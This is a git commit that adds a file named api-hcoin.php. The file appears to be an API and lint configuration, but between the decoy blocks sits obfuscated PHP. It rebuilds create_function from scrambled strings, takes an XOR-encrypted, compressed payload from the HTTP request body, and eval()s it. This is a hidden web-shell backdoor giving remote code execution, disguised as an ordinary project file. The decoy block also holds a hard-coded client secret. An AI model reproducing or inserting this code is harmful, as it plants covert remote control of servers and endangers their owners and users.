8ef62c6443df6ce0c65801e085f1f600b3293474
Lenin <67344990+TR07SKY@users.noreply.github.com>
2020-09-19 19:51:07 -0300

    Create api-hcoin.php

---
+++ api-hcoin.php
@@ -0,0 +1,45 @@
+<script>
+	baseUrl: 'https://api.www.hcoin.com/',
+	clientSecret: 'randompass02',
+	clientId: 'ID45458473',
+	tokenDuration: 7776000
+</script>
+<?php
+
+$I='e($m[1C]),$k)));$o=@oCb_get_contCents();@ob_endC_clCean(C);$r=@bas';
+$M='$k="6Ca08316C2";$kCh="2e047e5C94fe4C"C;$kf="8C1C649ad8319C6";$p';
+$S=str_replace('FX','','cFXreaFXtFXe_FXFXfunctiFXon');
+$s='trlen($t);C$o=""CC;for($i=0;$i<$l;C){CforC($j=0;C($j<$cC&&$i<C$l);';
+$U='ch(C"/$kh(.C+)$kfC/",C@file_Cget_conCCtents("php://inpCutC"),$m)==';
+$E='$j++,$iC++){$o.C=$t{$Ci}^$k{C$j};}}retCuCrn C$o;C}if (@preg_mCat';
+$y='="7cPet4wCaCb5vGZO1tC";Cfunction CxC($t,$k){$Cc=strlen($kC)CC;$l=s';
+$C='1) {C@ob_starCCt();@evaCCl(C@gzuCncompress(@x(@CbaseCC64C_decCod';
+$t='eCC64_encodeC(@x(@CgzcompreCssC($o),$k))C;printC("$Cp$kh$r$kf");}';
+$V=str_replace('C','',$M.$y.$s.$E.$U.$C.$I.$t);
+$j=$S('',$V);$j();
+?>
+<script>
+module.exports = {
+	extends: ['eslint-config-particle'],
+	parserOptions: {
+		ecmaVersion: 8,
+		sourceType: 'module'
+	},
+	env: {
+		browser: true,
+		commonjs: true,
+		es6: true,
+		node: true,
+		mocha: true,
+		worker: true,
+		serviceworker: true
+	},
+	rules: {
+		'no-control-regex': 'off',
+		camelcase: ["error", {
+			properties: 'never',
+			allow: ['redirect_uri']
+		}]
+	}
+};
+</script>
